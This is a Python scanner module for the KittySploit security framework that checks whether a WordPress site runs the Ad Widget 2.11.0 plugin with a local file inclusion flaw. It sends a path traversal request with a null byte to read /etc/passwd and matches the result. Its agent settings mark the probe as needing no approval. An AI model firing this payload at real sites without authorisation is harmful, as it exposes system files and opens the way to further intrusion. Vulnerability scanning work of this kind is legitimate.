#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Ad Widget 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Ad Widget 2.11.0 - Local File Inclusion Detection',
        'description': 'WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'adwidget', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2017100084',
            'https://plugins.trac.wordpress.org/changeset/1628751/ad-widget',
            'https://wpscan.com/vulnerability/caca21fe-56bf-4d4c-afc8-4a218e52f0a2',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress Ad Widget 2.11.0 - Local File Inclusion detected",
                path='/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00',
            )
            return True
        return False

